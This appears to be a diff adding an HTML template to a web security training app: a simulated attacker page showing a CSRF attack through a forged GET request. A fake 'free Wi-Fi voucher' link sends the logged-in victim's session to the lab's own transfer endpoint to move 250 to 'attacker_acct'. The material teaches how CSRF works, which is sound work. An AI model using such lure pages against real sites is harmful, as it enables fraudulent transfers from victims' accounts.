@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Simulated External Attacker Page — CSRF Demo</title>
+  <link rel="stylesheet" href="/static/css/style.css" />
+</head>
+<body style="display:flex; align-items:center; justify-content:center; min-height:100vh; padding:24px;">
+  <div class="card" style="max-width:620px; width:100%; border-color: var(--vuln-border);">
+    <div class="eyebrow" style="color:var(--vuln-red);">Simulated Untrusted Third-Party Website</div>
+    <h1>Congratulations! Claim Your Free Campus Wi-Fi Voucher</h1>
+    <p style="color:var(--text-secondary);">
+      This page simulates an external attacker-controlled website. When a logged-in victim visits or clicks the deceptive button below, the browser sends a forged <code>GET</code> request to <code>/modules/csrf-get/transfer?to=attacker_acct&amp;amount=250&amp;mode={{ mode }}</code> with the victim's active session cookie attached.
+    </p>
+    <div class="alert alert-info" style="font-family:var(--font-mono); font-size:12px;">
+      &lt;a href="/modules/csrf-get/transfer?to=attacker_acct&amp;amount=250&amp;mode={{ mode }}&amp;source=External+Attacker+Page"&gt;Claim Voucher&lt;/a&gt;
+    </div>
+    <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:16px;">
+      <a href="/modules/csrf-get/transfer?to=attacker_acct&amount=250&mode={{ mode }}&source=External+Attacker+Page" class="btn btn-danger">
+        Click Deceptive "Claim Voucher" Link (Triggers Forged GET)
+      </a>
+      <a href="/modules/csrf-get?mode={{ mode }}" class="btn">Return to Victim Wallet</a>
+    </div>
+  </div>
+</body>
+</html>
